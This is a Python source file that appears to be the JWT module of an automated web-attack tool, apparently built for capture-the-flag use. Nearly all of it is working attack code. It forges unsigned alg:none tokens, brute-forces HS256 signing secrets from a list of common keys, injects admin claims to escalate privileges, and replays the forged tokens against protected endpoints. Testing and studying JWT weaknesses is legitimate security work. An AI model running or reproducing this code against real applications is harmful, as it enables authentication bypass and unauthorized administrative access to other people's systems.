"""
JWT vulnerability attack module.
Covers: alg:none bypass, empty secret, weak HS256 secret brute-force,
        privilege escalation via claim manipulation.
No external dependencies — uses stdlib base64/hmac/hashlib only.
"""
from __future__ import annotations
import base64
import hashlib
import hmac as _hmac
import json

from attacks.base import BaseAttack
from engine.flag_hunter import extract_interesting_data, has_definite_flag
from rich.console import Console

console = Console()

COMMON_SECRETS = [
    "", "secret", "password", "123456", "jwt", "key",
    "mysecret", "jwtkey", "jwt_secret", "admin", "supersecret",
    "changeme", "token", "auth", "private", "s3cr3t",
    "p@ssw0rd", "qwerty", "1234567890", "jwt_secret_key",
    "your-secret-key", "HS256", "secretkey", "access_secret",
    "myapp", "appkey", "app_secret", "flask_secret", "django_key",
    "rails_secret", "express_secret", "laravel_key", "sym_secret",
]

# Claim key patterns to escalate to admin
ESCALATION_CLAIMS: dict[str, object] = {
    "role":     "admin",
    "roles":    ["admin"],
    "is_admin": True,
    "admin":    True,
    "group":    "admin",
    "groups":   ["admin"],
    "type":     "admin",
    "level":    "admin",
    "sub":      "admin",
}


# ── Base64URL helpers ─────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    pad = len(s) % 4
    if pad:                      # len%4==0 → no padding needed; avoid adding 4×"="
        s += "=" * (4 - pad)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_none_alg(token: str) -> list[str]:
    """Return 3 forged tokens with alg=none/None/NONE and empty signature."""
    parsed = _parse_jwt(token)
    if not parsed:
        return []
    header, payload, _ = parsed
    results = []
    for alg_val in ("none", "None", "NONE"):
        h = dict(header)
        h["alg"] = alg_val
        enc_h = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        enc_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        results.append(f"{enc_h}.{enc_p}.")
    return results


def _forge_hs256(
    token: str,
    secret: str,
    extra_claims: dict | None = None,
) -> str | None:
    parsed = _parse_jwt(token)
    if not parsed:
        return None
    header, payload, _ = parsed
    header = dict(header)
    header["alg"] = "HS256"
    if extra_claims:
        payload = dict(payload)
        payload.update(extra_claims)
    enc_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    enc_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{enc_h}.{enc_p}".encode()
    sig = _hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{enc_h}.{enc_p}.{_b64url_encode(sig)}"


def _verify_secret(token: str, secret: str) -> bool:
    """Check if `secret` is the signing key — no HTTP request, pure CPU."""
    parsed = _parse_jwt(token)
    if not parsed:
        return False
    header, _, original_sig = parsed
    if header.get("alg", "").upper() != "HS256":
        return False
    enc_h = token.split(".")[0]
    enc_p = token.split(".")[1]
    signing_input = f"{enc_h}.{enc_p}".encode()
    expected = _hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return _b64url_encode(expected) == original_sig


def _build_escalation_claims(payload: dict) -> dict | None:
    """Return only the claims present in the token that can be escalated."""
    changes = {}
    for key, escalated_value in ESCALATION_CLAIMS.items():
        if key in payload and payload[key] != escalated_value:
            changes[key] = escalated_value
    return changes or None


# ── Attack class ──────────────────────────────────────────────────────────────

class JWTAttack(BaseAttack):
    name = "jwt"

    async def _request_with_token(
        self,
        url: str,
        token: str,
        cookie_name: str | None = None,
    ) -> "httpx.Response | None":
        """Send GET with forged JWT in Authorization header (and optionally cookie)."""
        headers = {"Authorization": f"Bearer {token}"}
        cookies: dict[str, str] = {}
        if cookie_name:
            cookies[cookie_name] = token
        try:
            return await self.session.request(
                "GET", url, headers=headers, cookies=cookies, timeout=10.0
            )
        except Exception:
            return None

    async def _find_protected_url(
        self,
        urls: list[str],
        valid_jwt: str,
        cookie_name: str | None,
    ) -> tuple[str, int] | None:
        """
        Return (url, valid_status) for the first URL where:
          - valid JWT → 200
          - INVALID token → 401 or 403
        Returns None if no URL enforces auth.
        """
        for test_url in urls:
            valid_resp = await self._request_with_token(test_url, valid_jwt, cookie_name)
            if not valid_resp or valid_resp.status_code != 200:
                continue
            invalid_resp = await self._request_with_token(
                test_url, "TWEB_INVALID_TOKEN_XYZ", cookie_name
            )
            if not invalid_resp or invalid_resp.status_code not in (401, 403):
                continue
            return test_url, valid_resp.status_code
        return None

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        jwt_value: str | None = attack_point.get("jwt_value")
        test_urls: list[str] = attack_point.get("test_urls", [attack_point.get("url", "")])
        cookie_name: str | None = attack_point.get("jwt_cookie_name")

        if not jwt_value:
            return []

        parsed = _parse_jwt(jwt_value)
        if not parsed:
            console.print("  [dim][JWT] Token parse edilemedi, atlanıyor[/dim]")
            return []

        header, payload, _ = parsed
        alg = header.get("alg", "?")
        sub = payload.get("sub") or payload.get("user") or payload.get("username", "?")
        console.print(f"  [cyan][JWT][/cyan] Token: alg={alg} sub={sub!r}")

        # Step 0: Find a URL that actually enforces auth
        protected = await self._find_protected_url(test_urls, jwt_value, cookie_name)
        if not protected:
            console.print("  [dim][JWT] Auth korumalı endpoint bulunamadı, atlanıyor[/dim]")
            return []

        protected_url, _ = protected
        console.print(f"  [dim][JWT] Auth doğrulandı: {protected_url}[/dim]")

        all_findings: list[dict] = []
        working_secret: str | None = None

        # Step 1: alg:none bypass
        none_tokens = _forge_none_alg(jwt_value)
        for alg_val, forged in zip(("none", "None", "NONE"), none_tokens):
            if self._should_stop():
                return all_findings
            resp = await self._request_with_token(protected_url, forged, cookie_name)
            if resp and resp.status_code == 200:
                console.print(
                    f"  [bold red][JWT][/bold red] alg:none bypass! alg={alg_val!r}"
                )
                all_findings.append({
                    "type": "jwt_none_sig",
                    "value": f"JWT alg:none bypass (alg={alg_val!r}) @ {protected_url}",
                    "confidence": 0.95,
                })
                findings = extract_interesting_data(resp.text)
                flag = has_definite_flag(findings)
                if flag:
                    console.print(f"  [bold green][JWT][/bold green] FLAG: {flag}")
                    all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                    self.stop_event.set()
                    return all_findings
                break  # First working none variant is enough

        # Step 2 & 3: Brute-force HS256 secret (CPU-only, no network)
        if not working_secret and alg.upper() == "HS256":
            for secret in COMMON_SECRETS:
                if _verify_secret(jwt_value, secret):
                    working_secret = secret
                    console.print(
                        f"  [bold red][JWT][/bold red] Zayıf secret bulundu: {secret!r}"
                    )
                    # Confirm with network request
                    reforged = _forge_hs256(jwt_value, secret)
                    if reforged:
                        resp = await self._request_with_token(protected_url, reforged, cookie_name)
                        if resp and resp.status_code == 200:
                            all_findings.append({
                                "type": "jwt_weak_secret",
                                "value": (
                                    f"JWT weak secret {secret!r} @ {protected_url}"
                                ),
                                "confidence": 0.9,
                            })
                    break

        # Step 4: Privilege escalation (if any method worked)
        can_forge = bool(all_findings) or working_secret is not None
        if can_forge and not self._should_stop():
            escalation = _build_escalation_claims(payload)
            if escalation:
                if working_secret is not None:
                    priv_token = _forge_hs256(jwt_value, working_secret, extra_claims=escalation)
                else:
                    # Use alg:none for privilege escalation too
                    escalated_payload = dict(payload)
                    escalated_payload.update(escalation)
                    h = dict(header); h["alg"] = "none"
                    enc_h = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
                    enc_p = _b64url_encode(
                        json.dumps(escalated_payload, separators=(",", ":")).encode()
                    )
                    priv_token = f"{enc_h}.{enc_p}."

                if priv_token:
                    resp = await self._request_with_token(protected_url, priv_token, cookie_name)
                    if resp and resp.status_code == 200:
                        console.print(
                            f"  [bold red][JWT][/bold red] Privilege escalation! "
                            f"Claims: {escalation}"
                        )
                        all_findings.append({
                            "type": "jwt_privilege_escalation",
                            "value": (
                                f"JWT privilege escalation @ {protected_url} "
                                f"claims={escalation}"
                            ),
                            "confidence": 0.85,
                        })
                        try:
                            findings = extract_interesting_data(resp.text)
                            flag = has_definite_flag(findings)
                            if flag:
                                console.print(f"  [bold green][JWT][/bold green] FLAG: {flag}")
                                all_findings.extend(
                                    [f for f in findings if f.get("confidence", 0) >= 1.0]
                                )
                                self.stop_event.set()
                        except Exception:
                            pass

        return all_findings
